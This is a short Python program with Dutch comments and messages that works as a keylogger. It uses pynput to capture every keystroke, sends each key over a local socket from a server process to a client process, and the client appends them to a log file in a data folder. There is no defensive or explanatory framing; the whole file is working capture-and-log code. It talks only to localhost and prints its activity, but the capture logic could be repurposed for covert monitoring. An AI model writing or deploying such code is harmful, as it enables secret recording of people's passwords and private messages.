import socket
from pynput.keyboard import Listener
import multiprocessing
import os
import time

PORT = 48225  # Vervang door een vaste poort om consistentie te garanderen

def start_keylogger_server():
    host = '127.0.0.1'
    print(f"Keylogger server draait op poort {PORT}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, PORT))
        server_socket.listen(1)
        print("Wachten op verbinding...")
        client_socket, client_addr = server_socket.accept()
        print(f"Verbonden met {client_addr}")

        def on_press(key):
            try:
                client_socket.sendall(f"Toetsaanslag: {key.char}\n".encode())
            except AttributeError:
                client_socket.sendall(f"Speciale toets: {key}\n".encode())

        with Listener(on_press=on_press) as listener:
            listener.join()

def start_keylogger_client():
    host = '127.0.0.1'

    # Create the data directory if it doesn't exist within the project
    data_dir = os.path.join(os.path.dirname(__file__), '..', 'data')
    if not os.path.exists(data_dir):
        os.makedirs(data_dir)

    log_file = os.path.join(data_dir, 'keylogger_log.txt')

    # Delay the client start by 5 seconds
    time.sleep(5)
    print(f"Connecting to server at {host}:{PORT}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, PORT))
        print(f"Connected to server at {host}:{PORT}")
        with open(log_file, 'a') as f:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                print(f"Writing data to file: {data.decode()}")
                f.write(data.decode())
                f.flush()

def run():
    server_process = multiprocessing.Process(target=start_keylogger_server)
    client_process = multiprocessing.Process(target=start_keylogger_client)

    server_process.start()
    client_process.start()

    server_process.join()
    client_process.join()

if __name__ == "__main__":
    run()
